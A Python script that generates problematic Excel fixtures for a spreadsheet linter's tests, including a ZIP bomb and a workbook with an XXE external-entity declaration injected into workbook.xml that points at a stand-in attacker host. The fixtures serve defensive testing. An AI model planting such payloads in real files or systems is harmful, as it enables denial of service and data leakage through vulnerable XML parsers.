"""Generate problematic Excel files for grepxcel lint integration testing.

Output directory: tests/fixtures/lint/  (gitignored — never committed)

Fixtures produced
-----------------
Synthetic (no external deps beyond openpyxl + stdlib):
  zip_bomb.xlsx           — ZIP that decompresses >50× (ratio guard)
  xxe_injected.xlsx       — <!DOCTYPE/<!ENTITY injected into workbook.xml
  corrupt_zip.xlsx        — valid ZIP magic, broken body
  xlsb_binary.xlsb        — rejected binary/macro extension
  inflated_dimensions.xlsx — styled ghost cells inflate declared size
  merged_cells.xlsx       — merged cell regions (warn)
  formula_cells.xlsx      — cached-value formulas (warn)
  empty_sheet.xlsx        — workbook with no data

Downloaded (real-world OLE/encrypted file from oletools test suite):
  ole_encrypted.xlsx      — OLE Compound Document (encrypted/IRM)
                            source: github.com/decalage2/oletools (MIT)

Attribution
-----------
XXE injection technique informed by XXElixir by Milan Jovic
(https://github.com/kljunowsky/XXElixir). See memory/project_xxe_attribution_pending.md.
"""
from __future__ import annotations

import io
import os
import sys
import urllib.request
import zipfile
import zlib

# ── venv bootstrap (no-op in CI where packages are installed directly) ────────
_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
_VENV_PY = os.path.join(_ROOT, '.venv', 'bin', 'python3')
if os.path.exists(_VENV_PY) and os.path.abspath(sys.executable) != os.path.abspath(_VENV_PY):
    import subprocess
    sys.exit(subprocess.run([_VENV_PY] + sys.argv).returncode)  # nosec B603

import openpyxl  # noqa: E402 — after venv bootstrap
from openpyxl.styles import Font, PatternFill  # noqa: E402

OUT = os.path.join(_ROOT, 'tests', 'fixtures', 'lint')
os.makedirs(OUT, exist_ok=True)


def _path(name: str) -> str:
    return os.path.join(OUT, name)


# ── 1. ZIP bomb (ratio >50×) ──────────────────────────────────────────────────

def make_zip_bomb() -> None:
    payload = b'\x00' * (3 * 1024 * 1024)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        info = zipfile.ZipInfo('[Content_Types].xml')
        info.compress_type = zipfile.ZIP_DEFLATED
        zf.writestr(info, payload)
    with open(_path('zip_bomb.xlsx'), 'wb') as f:
        f.write(buf.getvalue())
    print('  generated: zip_bomb.xlsx')


# ── 2. XXE-injected xlsx (XXElixir technique) ─────────────────────────────────
# Creates a valid xlsx, then injects <!DOCTYPE ... <!ENTITY ...> into
# xl/workbook.xml before handing it to anything that parses XML.

def make_xxe_injected() -> None:
    wb = openpyxl.Workbook()
    ws = wb.active
    ws['A1'] = 'normal data'
    src = io.BytesIO()
    wb.save(src)
    src.seek(0)

    out = io.BytesIO()
    with zipfile.ZipFile(src) as zin, zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            data = zin.read(item.filename)
            if item.filename == 'xl/workbook.xml':
                # Inject DOCTYPE declaration with external entity reference
                # (same technique used by XXElixir, github.com/kljunowsky/XXElixir)
                xxe_decl = (
                    b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
                    b'<!DOCTYPE foo [\n'
                    b'  <!ENTITY xxe SYSTEM "http://attacker.example.com/xxe">\n'
                    b']>\n'
                )
                # Strip the original XML declaration if present
                if data.startswith(b'<?xml'):
                    data = data[data.index(b'?>') + 2:].lstrip()
                data = xxe_decl + data
            zout.writestr(item.filename, data)

    with open(_path('xxe_injected.xlsx'), 'wb') as f:
        f.write(out.getvalue())
    print('  generated: xxe_injected.xlsx')


# ── 3. Corrupt ZIP (valid magic, broken body) ─────────────────────────────────

def make_corrupt_zip() -> None:
    with open(_path('corrupt_zip.xlsx'), 'wb') as f:
        f.write(b'PK\x03\x04' + b'\xff' * 200)
    print('  generated: corrupt_zip.xlsx')


# ── 4. Binary/macro extension ─────────────────────────────────────────────────

def make_xlsb() -> None:
    with open(_path('xlsb_binary.xlsb'), 'wb') as f:
        f.write(b'PK\x03\x04' + b'\x00' * 50)
    print('  generated: xlsb_binary.xlsb')


# ── 5. Inflated dimensions ────────────────────────────────────────────────────

def make_inflated_dimensions() -> None:
    wb = openpyxl.Workbook()
    ws = wb.active
    ws['A1'] = 'data'
    ws['B2'] = 'more'
    ws.cell(row=600, column=1).font = Font(bold=True)
    ws.cell(row=1, column=300).fill = PatternFill('solid', fgColor='FF0000')
    wb.save(_path('inflated_dimensions.xlsx'))
    print('  generated: inflated_dimensions.xlsx')


# ── 6. Merged cells ───────────────────────────────────────────────────────────

def make_merged_cells() -> None:
    wb = openpyxl.Workbook()
    ws = wb.active
    ws['A1'] = 'merged header'
    ws.merge_cells('A1:D1')
    ws['A2'] = 'row1'
    ws['B2'] = 'row2'
    wb.save(_path('merged_cells.xlsx'))
    print('  generated: merged_cells.xlsx')


# ── 7. Formula cells ──────────────────────────────────────────────────────────

def make_formula_cells() -> None:
    wb = openpyxl.Workbook()
    ws = wb.active
    ws['A1'] = 10
    ws['A2'] = 20
    ws['A3'] = '=SUM(A1:A2)'
    ws['B1'] = '=A1*2'
    wb.save(_path('formula_cells.xlsx'))
    print('  generated: formula_cells.xlsx')


# ── 8. Empty sheet ────────────────────────────────────────────────────────────

def make_empty_sheet() -> None:
    wb = openpyxl.Workbook()
    wb.active.title = 'Empty'
    wb.save(_path('empty_sheet.xlsx'))
    print('  generated: empty_sheet.xlsx')


# ── 9. Real OLE-encrypted xlsx (downloaded from oletools test suite) ──────────
# Source: github.com/decalage2/oletools  (MIT-licensed test data)
# This file is a real OLE Compound Document (.xlsx encrypted with standard
# password), not synthetic — it validates lint's OLE magic byte detection
# against a file produced by actual Excel encryption tooling.

_OLETOOLS_ENCRYPTED_URL = (
    'https://raw.githubusercontent.com/decalage2/oletools/master'
    '/tests/test-data/encrypted/encrypted.xlsx'
)

def download_ole_encrypted() -> None:
    dest = _path('ole_encrypted.xlsx')
    try:
        req = urllib.request.Request(
            _OLETOOLS_ENCRYPTED_URL,
            headers={'User-Agent': 'grepxcel-lint-fixture-generator/1.0'},
        )
        with urllib.request.urlopen(req, timeout=30) as resp:  # nosec B310
            data = resp.read()
        with open(dest, 'wb') as f:
            f.write(data)
        print(f'  downloaded: ole_encrypted.xlsx ({len(data):,} bytes)')
    except Exception as exc:
        print(f'  WARNING: could not download ole_encrypted.xlsx: {exc}', file=sys.stderr)
        print('           tests that require it will be skipped.', file=sys.stderr)


# ── main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    print(f'Writing lint fixtures to: {OUT}')
    make_zip_bomb()
    make_xxe_injected()
    make_corrupt_zip()
    make_xlsb()
    make_inflated_dimensions()
    make_merged_cells()
    make_formula_cells()
    make_empty_sheet()
    download_ole_encrypted()
    print('Done.')


if __name__ == '__main__':
    main()
